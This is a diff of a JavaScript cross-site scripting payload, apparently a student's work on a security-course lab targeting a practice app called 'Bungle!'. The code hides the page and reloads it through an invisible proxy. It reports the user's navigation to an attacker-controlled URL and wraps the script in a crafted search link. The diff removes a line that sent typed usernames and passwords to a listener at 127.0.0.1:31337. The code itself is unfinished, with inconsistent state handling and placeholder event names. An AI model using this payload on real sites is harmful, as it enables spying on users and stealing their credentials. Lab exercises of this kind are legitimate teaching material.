@@ -2,32 +2,51 @@
 <script src="http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
 <script>
 // Extend this function:
+state = "login";
 function payload(attacker) {
     function log(data) {
         console.log($.param(data));
         $.get(attacker, data);
     }
-    function proxy(href) {
-        $("html").load(href, function(){
-            $("html").show();
-            log({event: "nav", uri: href});
-            window.history.replaceState('', "Bungle!","./search");
-        });
+    function proxy(href, state) {
+        if(state == "search"){
+            $("html").load(href, function(){
+                $("html").show();
+                log({event: "nav", uri: href});
+                window.history.replaceState('', "Bungle!","./search");
+            });
+        } else if(state == "login"){
+            $("html").load(href, function(){
+                $("html").show();
+                log({event: "POOP", uri: href});
+                window.history.replaceState('', "Bungle!","./search");
+            });
+        } else if(state == "logout"){
+            $("html").load(href, function(){
+                $("html").show();
+                log({event: "BUTT", uri: href});
+                window.history.replaceState('', "Bungle!","./search");
+            });
+        }
     }
-    $("#search-btn").click(function(){
-       window.history.replaceState('', "Bungle!","./search");
-    });
     $("html").hide();
-    $("#log-in-btn").click(function(){
-        $.get("http://127.0.0.1:31337/stolen?even=login&user=" + $("#username").val() + "&pass=" + $("#userpass").val());
-    });
-    proxy("./");
-
+    if(state == "nav"){
+        proxy("./", "search");
+    } else if (state == "login"){
+        proxy("./", "login");
+    } else if (state == "logout"){
+        proxy("./", "logout");
+    }
+    
 }
+
+
+
+
 function makeLink(xssdefense, target, attacker) {
     if (xssdefense == 0) {
         return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" +
-        encodeURIComponent("<script" + ">" + payload.toString() +
+        encodeURIComponent("<script" + ">state=\"logout\";" + payload.toString() +
         ";payload(\"" + attacker + "\");</script" + ">");
     } else {
         // Implement code to defeat XSS defenses here.
